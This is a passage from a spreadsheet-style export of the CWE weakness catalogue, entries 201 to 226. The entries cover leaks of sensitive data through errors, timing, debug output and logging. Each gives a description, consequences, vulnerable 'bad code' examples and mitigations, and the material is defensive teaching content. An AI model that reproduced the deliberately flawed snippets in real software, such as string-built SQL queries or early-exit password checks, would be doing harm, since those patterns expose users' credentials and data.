{%>User account number: <%= acctNo %><%} %>The code writes sensitive debug information to the client browser if the ""debugEnabled"" flag is set to true .Example 8This code uses location to determine the user's current US State location.First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:(bad code)Example Language:XML<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();Location userCurrLocation;userCurrLocation = locationClient.getLastLocation();deriveStateFromCoords(userCurrLocation);While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-201: Insertion of Sensitive Information Into Sent Data,"The code transmits data to another actor, but a portion of the data includes sensitive information that should not be accessible to that actor.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories; Read Memory; Read Application DataSensitive data may be exposed to attackers., Likelihood: ",Example 1The following is an actual MySQL error statement:(result)Example Language:SQLWarning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4The error clearly exposes the database credentials.,"Phase:  RequirementsSpecify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data.Phase:  ImplementationEnsure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent.Phase:  System ConfigurationSetup default error messages so that unexpected errors do not disclose sensitive information.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-202: Exposure of Sensitive Information Through Data Queries,"When trying to keep information confidential, an attacker can often infer some of the information by using statistics.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories; Read Application DataSensitive information may possibly be leaked through data queries accidentally., Likelihood: ",Example 1See the book Translucent Databases for examples.,Phase:  Architecture and DesignThis is a complex topic. See the book Translucent Databases for a good discussion of best practices.
CWE-203: Observable Discrepancy,"The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection MechanismAn attacker can gain access to sensitive information about the system, including authentication information that may allow an attacker to gain access to the system., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataWhen cryptographic primitives are vulnerable to side-channel-attacks, this could be used to reveal unencrypted plaintext in the worst case., Likelihood: ","Example 1The following code checks validity of the supplied username and password and notifies the user of a successful or failed login.(bad code)Example Language:Perlmy $username=param('username');my $password=param('password');if (IsValidUsername($username) == 1){if (IsValidPassword($username, $password) == 1){print ""Login Successful"";}else{print ""Login Failed - incorrect password"";}}else{print ""Login Failed - unknown username"";}In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials.While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:(result)""Login Failed - incorrect username or password""Example 2In this example, the attacker observes how long an authentication takes when the user types in the correct password.When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses.(bad code)Example Language:Pythondef validate_password(actual_pw, typed_pw):if len(actual_pw) <> len(typed_pw):return 0for i in len(actual_pw):if actual_pw[i] <> typed_pw[i]:return 0return 1Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length.Example 3Non-uniform processing time causes timing channel.(bad code)Suppose an algorithm for implementing an encryption routine works fine per se, but the time taken to output the result of the encryption routine depends on a relationship between the input plaintext and the key (e.g., suppose, if the plaintext is similar to the key, it would run very fast).In the example above, an attacker may vary the inputs, then observe differences between processing times (since different plaintexts take different time). This could be used to infer information about the key.(good code)Artificial delays may be added to ensured all calculations take equal time to execute.Example 4Suppose memory access patterns for an encryption routine are dependent on the secret key.An attacker can recover the key by knowing if specific memory locations have been accessed or not.  The value stored at those memory locations is irrelevant.  The encryption routine's memory accesses will affect the state of the processor cache.  If cache resources are shared across contexts, after the encryption routine completes, an attacker in different execution context can discover which memory locations the routine accessed by measuring the time it takes for their own memory accesses to complete.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not."
CWE-204: Observable Response Discrepancy,The product provides different responses to incoming requests in a way that reveals internal state information to an unauthorized actor outside of the intended control sphere.,"Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ","Example 1The following code checks validity of the supplied username and password and notifies the user of a successful or failed login.(bad code)Example Language:Perlmy $username=param('username');my $password=param('password');if (IsValidUsername($username) == 1){if (IsValidPassword($username, $password) == 1){print ""Login Successful"";}else{print ""Login Failed - incorrect password"";}}else{print ""Login Failed - unknown username"";}In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials.While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:(result)""Login Failed - incorrect username or password""","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not."
CWE-205: Observable Behavioral Discrepancy,"The product's behaviors indicate important differences that may be observed by unauthorized actors in a way that reveals (1) its internal state or decision process, or (2) differences from other products with equivalent functionality.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-206: Observable Internal Behavioral Discrepancy,"The product performs multiple behaviors that are combined to produce a single result, but the individual behaviors are observable separately in a way that allows attackers to reveal internal state or internal decision points.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ",无示范例子,"Setup generic response pages for error conditions. The error page should not disclose information about the success or failure of a sensitive operation. For instance, the login page should not confirm that the login is correct and the password incorrect. The attacker who tries random account name may be able to guess some of them. Confirming that the account exists would make the login page more susceptible to brute force attack."
CWE-207: Observable Behavioral Discrepancy With Equivalent Products,"The product operates in an environment in which its existence or specific identity should not be known, but it behaves differently than other products with equivalent functionality, in a way that is observable to an attacker.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-208: Observable Timing Discrepancy,"Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ","Example 1Consider an example hardware module that checks a user-provided password to grant access to a user. The user-provided password is compared against a golden value in a byte-by-byte manner.(bad code)Example Language:Verilogalways_comb @ (posedge clk)beginassign check_pass[3:0] = 4'b0;for (i = 0; i < 4; i++) beginif (entered_pass[(i*8 - 1) : i] eq golden_pass([i*8 - 1) : i])assign check_pass[i] = 1;continue;elseassign check_pass[i] = 0;break;endassign grant_access = (check_pass == 4'b1111) ? 1'b1: 1'b0;endSince the code breaks on an incorrect entry of password, an attacker can guess the correct password for that byte-check iteration with few repeat attempts.To fix this weakness, either the comparison of the entire string should be done all at once, or the attacker is not given an indication whether pass or fail happened by allowing the comparison to run through all bits before the grant_access signal is set.(good code)always_comb @ (posedge clk)beginassign check_pass[3:0] = 4'b0;for (i = 0; i < 4; i++) beginif (entered_pass[(i*8 - 1) : i] eq golden_pass([i*8 -1) : i])assign check_pass[i] = 1;continue;elseassign check_pass[i] = 0;continue;endassign grant_access = (check_pass == 4'b1111) ? 1'b1: 1'b0;endExample 2In this example, the attacker observes how long an authentication takes when the user types in the correct password.When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses.(bad code)Example Language:Pythondef validate_password(actual_pw, typed_pw):if len(actual_pw) <> len(typed_pw):return 0for i in len(actual_pw):if actual_pw[i] <> typed_pw[i]:return 0return 1Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length.",无可能的缓解方案
CWE-209: Generation of Error Message Containing Sensitive Information,"The product generates an error message that includes sensitive information about its environment, users, or associated data.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataOften this will either reveal sensitive information which may be used for a later attack or private information stored in the server., Likelihood: ","Example 1In the following example, sensitive information might be printed depending on the exception that occurs.(bad code)Example Language:Javatry {/.../}catch (Exception e) {System.out.println(e);}If an exception related to SQL is handled by the catch, then the output might contain sensitive information such as SQL query structure or private information. If this output is redirected to a web user, this may represent a security problem.Example 2This code tries to open a database connection, and prints any exceptions that occur.(bad code)Example Language:PHPtry {openDbConnection();}//print exception message that includes exception message and configuration file locationcatch (Exception $e) {echo 'Caught exception: ', $e->getMessage(), '\n';echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';}If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database.Example 3The following code generates an error message that leaks the full pathname of the configuration file.(bad code)Example Language:Perl$ConfigDir = ""/home/myprog/config"";$uname = GetUserInput(""username"");# avoidCWE-22,CWE-78, others.ExitError(""Bad hacker!"") if ($uname !~ /^\w+$/);$file = ""$ConfigDir/$uname.txt"";if (! (-e $file)) {ExitError(""Error: $file does not exist"");}...If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.Example 4In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.(bad code)Example Language:Javapublic BankAccount getUserBankAccount(String username, String accountNumber) {BankAccount userAccount = null;String query = null;try {if (isAuthorizedUser(username)) {query = ""SELECT * FROM accounts WHERE owner = ""+ username + "" AND accountID = "" + accountNumber;DatabaseManager dbManager = new DatabaseManager();Connection conn = dbManager.getConnection();Statement stmt = conn.createStatement();ResultSet queryResult = stmt.executeQuery(query);userAccount = (BankAccount)queryResult.getObject(accountNumber);}} catch (SQLException ex) {String logMessage = ""Unable to retrieve account information from database,\nquery: "" + query;Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);}return userAccount;}The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.","Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.Phase:  ImplementationHandle exceptions internally and do not display errors containing potentially sensitive information to a user.Phase:  ImplementationStrategy:  Attack Surface ReductionUse naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.Effectiveness: Defense in DepthNote:This makes it easier to spot places in the code where data is being used that is unencrypted.Phases:  Implementation; Build and CompilationStrategy:  Compilation or Build HardeningDebugging information should not make its way into a production release.Phases:  Implementation; Build and CompilationStrategy:  Environment HardeningDebugging information should not make its way into a production release.Phase:  System ConfigurationWhere available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.Phase:  System ConfigurationCreate default error pages or messages that do not leak any information."
CWE-210: Self-generated Error Message Containing Sensitive Information,The product identifies an error condition and creates its own diagnostic or error messages that contain sensitive information.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code uses custom configuration files for each user in the application. It checks to see if the file exists on the system before attempting to open and use the file. If the configuration file does not exist, then an error is generated, and the application exits.(bad code)Example Language:Perl$uname = GetUserInput(""username"");# avoidCWE-22,CWE-78, others.if ($uname !~ /^\w+$/){ExitError(""Bad hacker!"") ;}$filename = ""/home/myprog/config/"" . $uname . "".txt"";if (!(-e $filename)){ExitError(""Error: $filename does not exist"");}If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that is not associated with a configuration file, an attacker could get this pathname from the error message. It could then be used to exploit path traversal, symbolic link following, or other problems that may exist elsewhere in the application.",Phases:  Implementation; Build and CompilationStrategy:  Compilation or Build HardeningDebugging information should not make its way into a production release.Phases:  Implementation; Build and CompilationStrategy:  Environment HardeningDebugging information should not make its way into a production release.
CWE-211: Externally-Generated Error Message Containing Sensitive Information,"The product performs an operation that triggers an external diagnostic or error message that is not directly generated or controlled by the product, such as an error generated by the programming language interpreter that a software application uses. The error can contain sensitive system information.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following servlet code does not catch runtime exceptions, meaning that if such an exception were to occur, the container may display potentially dangerous information (such as a full stack trace).(bad code)Example Language:Javapublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {String username = request.getParameter(""username"");// May cause unchecked NullPointerException.if (username.length() < 10) {...}}Example 2In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user.(bad code)Example Language:Javapublic class InputFileRead {private File readFile = null;private FileReader reader = null;private String inputFilePath = null;private final String DEFAULT_FILE_PATH = ""c:\\somedirectory\\"";public InputFileRead() {inputFilePath = DEFAULT_FILE_PATH;}public void setInputFile(String inputFile) {/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */}public void readInputFile() {try {reader = new FileReader(readFile);...} catch (RuntimeException rex) {System.err.println(""Error: Cannot open input file in the directory "" + inputFilePath);System.err.println(""Input file has not been set, call setInputFile method before calling readInputFile"");} catch (FileNotFoundException ex) {...}}}However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user.","Phase:  System ConfigurationConfigure the application's environment in a way that prevents errors from being generated. For example, in PHP, disable display_errors.Phases:  Implementation; Build and CompilationStrategy:  Compilation or Build HardeningDebugging information should not make its way into a production release.Phases:  Implementation; Build and CompilationStrategy:  Environment HardeningDebugging information should not make its way into a production release.Phase:  ImplementationHandle exceptions internally and do not display errors containing potentially sensitive information to a user. Create default error pages if necessary.Phase:  ImplementationThe best way to prevent this weakness during implementation is to avoid any bugs that could trigger the external error message. This typically happens when the program encounters fatal errors, such as a divide-by-zero. You will not always be able to control the use of error pages, and you might not be using a language that handles exceptions."
CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer,"The product stores, transfers, or shares a resource that contains sensitive information, but it does not properly remove that information before the product makes the resource available to unauthorized actors.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories; Read Application DataSensitive data may be exposed to an unauthorized actor in another control sphere. This may have a wide range of secondary consequences which will depend on what data is exposed. One possibility is the exposure of system data allowing an attacker to craft a specific, more effective attack., Likelihood: ","Example 1This code either generates a public HTML user information page or a JSON response containing the same user information.(bad code)Example Language:PHP// API flag, output JSON if set$json = $_GET['json']$username = $_GET['user']if(!$json){$record = getUserRecord($username);foreach($record as $fieldName => $fieldValue){if($fieldName == ""email_address"") {// skip displaying user emailscontinue;}else{writeToHtmlPage($fieldName,$fieldValue);}}}else{$record = getUserRecord($username);echo json_encode($record);}The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address.","Phase:  RequirementsClearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phase:  ImplementationStrategy:  Attack Surface ReductionUse naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.Effectiveness: Defense in DepthNote:This makes it easier to spot places in the code where data is being used that is unencrypted.Phase:  ImplementationAvoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state."
CWE-213: Exposure of Sensitive Information Due to Incompatible Policies,"The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1This code displays some information on a web page.(bad code)Example Language:JSPSocial Security Number: <%= ssn %></br>Credit Card Number: <%= ccn %>The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.",无可能的缓解方案
CWE-214: Invocation of Process Using Visible Sensitive Information,"A process is invoked with sensitive command-line arguments, environment variables, or other elements that can be seen by other processes on the operating system.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1In the example below, the password for a keystore file is read from a system property.(bad code)Example Language:JavaString keystorePass = System.getProperty(""javax.net.ssl.keyStorePassword"");if (keystorePass == null) {System.err.println(""ERROR: Keystore password not specified."");System.exit(-1);}...If the property is defined on the command line when the program is invoked (using the -D... syntax), the password may be displayed in the OS process list.",无可能的缓解方案
CWE-215: Insertion of Sensitive Information Into Debugging Code,"The product inserts sensitive information into debugging code, which could expose this information if the debugging code is not disabled in production.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following program changes its behavior based on a debug flag.(bad code)Example Language:JSP<% if (Boolean.getBoolean(""debugEnabled"")) {%>User account number: <%= acctNo %><%} %>The code writes sensitive debug information to the client browser if the ""debugEnabled"" flag is set to true .","Phase:  ImplementationDo not leave debug statements that could be executed in the source code. Ensure that all debug information is eradicated before releasing the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-216: DEPRECATED: Containment Errors (Container Errors),"This entry has been deprecated, as it was not effective as a weakness and was structured more like a category. In addition, the name is inappropriate, since the ""container"" term is widely understood by developers in different ways than originally intended by PLOVER, the original source for this entry.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification,This entry has been deprecated because it incorporated and confused multiple weaknesses. The issues formerly covered in this entry can be found atCWE-766andCWE-767.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-218: DEPRECATED: Failure to provide confidentiality for stored data,This weakness has been deprecated because it was a duplicate ofCWE-493. All content has been transferred toCWE-493.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-219: Storage of File with Sensitive Data Under Web Root,"The product stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,Phases:  Implementation; System ConfigurationAvoid storing information under the web root directory.Phase:  System ConfigurationAccess control permissions should be set to prevent reading/writing of sensitive files inside/outside of the web directory.
CWE-220: Storage of File With Sensitive Data Under FTP Root,"The product stores sensitive data under the FTP server root with insufficient access control, which might make it accessible to untrusted parties.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,Phases:  Implementation; System ConfigurationAvoid storing information under the FTP root directory.Phase:  System ConfigurationAccess control permissions should be set to prevent reading/writing of sensitive files inside/outside of the FTP directory.
CWE-221: Information Loss or Omission,"The product does not record, or improperly records, security-relevant information that leads to an incorrect decision or hampers later analysis.","Scope: Non-Repudiation, Impact: Technical Impact:Hide Activities, Likelihood: ","Example 1This code logs suspicious multiple login attempts.(bad code)Example Language:PHPfunction login($userName,$password){if(authenticate($userName,$password)){return True;}else{incrementLoginAttempts($userName);if(recentLoginAttempts($userName) > 5){writeLog(""Failed login attempt by User: "" . $userName . "" at "" + date('r') );}}}This code only logs failed login attempts when a certain limit is reached. If an attacker knows this limit, they can stop their attack from being discovered by avoiding the limit.",无可能的缓解方案
CWE-222: Truncation of Security-relevant Information,"The product truncates the display, recording, or processing of security-relevant information in a way that can obscure the source or nature of an attack.","Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesThe source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice., Likelihood: ",无示范例子,无可能的缓解方案
CWE-223: Omission of Security-relevant Information,"The product does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.","Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesThe source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice., Likelihood: ","Example 1This code logs suspicious multiple login attempts.(bad code)Example Language:PHPfunction login($userName,$password){if(authenticate($userName,$password)){return True;}else{incrementLoginAttempts($userName);if(recentLoginAttempts($userName) > 5){writeLog(""Failed login attempt by User: "" . $userName . "" at "" + date('r') );}}}This code only logs failed login attempts when a certain limit is reached. If an attacker knows this limit, they can stop their attack from being discovered by avoiding the limit.Example 2This code prints the contents of a file if a user has permission.(bad code)Example Language:PHPfunction readFile($filename){$user = getCurrentUser();$realFile = $filename;//resolve file if its a symbolic linkif(is_link($filename)){$realFile = readlink($filename);}if(fileowner($realFile) == $user){echo file_get_contents($realFile);return;}else{echo 'Access denied';writeLog($user . ' attempted to access the file '. $filename . ' on '. date('r'));}}While the code logs a bad access attempt, it logs the user supplied name for the file, not the canonicalized file name. An attacker can obscure their target by giving the script the name of a link to the file they are attempting to access. Also note this code contains a race condition between the is_link() and readlink() functions (CWE-363).",无可能的缓解方案
CWE-224: Obscured Security-relevant Information by Alternate Name,"The product records security-relevant information according to an alternate name of the affected entity, instead of the canonical name.","Scope: Non-RepudiationAccess Control, Impact: Technical Impact:Hide Activities; Gain Privileges or Assume Identity, Likelihood: ","Example 1This code prints the contents of a file if a user has permission.(bad code)Example Language:PHPfunction readFile($filename){$user = getCurrentUser();$realFile = $filename;//resolve file if its a symbolic linkif(is_link($filename)){$realFile = readlink($filename);}if(fileowner($realFile) == $user){echo file_get_contents($realFile);return;}else{echo 'Access denied';writeLog($user . ' attempted to access the file '. $filename . ' on '. date('r'));}}While the code logs a bad access attempt, it logs the user supplied name for the file, not the canonicalized file name. An attacker can obscure their target by giving the script the name of a link to the file they are attempting to access. Also note this code contains a race condition between the is_link() and readlink() functions (CWE-363).",无可能的缓解方案
CWE-225: DEPRECATED: General Information Management Problems,This weakness can be found atCWE-199.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-226: Sensitive Information in Resource Not Removed Before Reuse,"The product releases a resource such as memory or a file so that it can be made available for reuse, but it does not clear or ""zeroize"" the information contained in the resource before the product performs a critical state transition or makes the resource available for reuse by other entities.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1This example shows how an attacker can take advantage of an incorrect state transition.Suppose a device is transitioning from state A to state B. During state A, it can read certain private keys from the hidden fuses that are only accessible in state A but not in state B. The device reads the keys, performs operations using those keys, then transitions to state B, where those private keys should no longer be accessible.(bad code)During the transition from A to B, the device does not scrub the memory.After the transition to state B, even though the private keys are no longer accessible directly from the fuses in state B, they can be accessed indirectly by reading the memory that contains the private keys.(good code)For transition from state A to state B, remove information which should not be available once the transition is complete.Example 2The following code calls realloc() on a buffer containing sensitive data:(bad code)Example Language:Ccleartext_buffer = get_secret();...cleartext_buffer = realloc(cleartext_buffer, 1024);...scrub_memory(cleartext_buffer, 1024);There is an attempt to scrub the sensitive data from memory, but realloc() is used, so it could return a pointer to a different part of memory. The memory that was originally allocated for cleartext_buffer could still contain an uncleared copy of the data.Example 3The following example code is excerpted from the AES wrapper/interface, aes0_wrapper, module of 
		 one of the AES engines (AES0) in the Hack@DAC'21 buggy OpenPiton System-on-Chip (SoC). Note that 
		 this SoC contains three distinct AES engines. Within this wrapper module, four 32-bit registers are 
		 utilized to store the message intended for encryption, referred to as p_c[i]. Using the AXI Lite 
		 interface, these registers are filled with the 128-bit message to be encrypted.(bad code)Example Language:Verilogmodule aes0_wrapper #(...)(...);...always @(posedge clk_i)beginif(~(rst_ni && ~rst_1)) //clear p_c[i] at resetbeginstart <= 0;p_c[0] <= 0;p_c[1] <= 0;p_c[2] <= 0;p_c[3] <= 0;...endelse if(en && we)case(address[8:3])0:start  <= reglk_ctrl_i[1] ? start  : wdata[0];1:p_c[3] <= reglk_ctrl_i[3] ? p_c[3] : wdata[31:0];2:p_c[2] <= reglk_ctrl_i[3] ? p_c[2] : wdata[31:0];3:p_c[1] <= reglk_ctrl_i[3] ? p_c[1] : wdata[31:0];4:p_c[0] <= reglk_ctrl_i[3] ? p_c[0] : wdata[31:0];...endcaseend // always @ (posedge wb_clk_i)endmoduleThe above code snippet [REF-1402] illustrates an instance of a vulnerable implementation of the AES wrapper module, where p_c[i] registers are cleared at reset. Otherwise, p_c[i]registers either maintain their old values (if reglk_ctrl_i[3]is true) or get filled through the AXI signal wdata. Note that p_c[i]registers can be read through the AXI Lite interface (not shown in snippet). However, p_c[i] registers are never cleared after their usage once the AES engine has completed the encryption process of the message. In a multi-user or multi-process environment, not clearing registers may result in the attacker process accessing data left by the victim, leading to data leakage or unintentional information disclosure.To fix this issue, it is essential to ensure that these internal registers are cleared in a timely manner after their usage, i.e., the encryption process is complete. This is illustrated below by monitoring the assertion of the cipher text valid signal, ct_valid [REF-1403].(good code)Example Language:Verilogmodule aes0_wrapper #(...)(...);...always @(posedge clk_i)beginif(~(rst_ni && ~rst_1)) //clear p_c[i] at reset...else if(ct_valid) //encryption process complete, clear p_c[i]beginp_c[0] <= 0;p_c[1] <= 0;p_c[2] <= 0;p_c[3] <= 0;endelse if(en && we)case(address[8:3])...endcaseend // always @ (posedge wb_clk_i)endmodule","Phases:  Architecture and Design; ImplementationDuring critical state transitions, information not needed in the next state should be removed or overwritten with fixed patterns 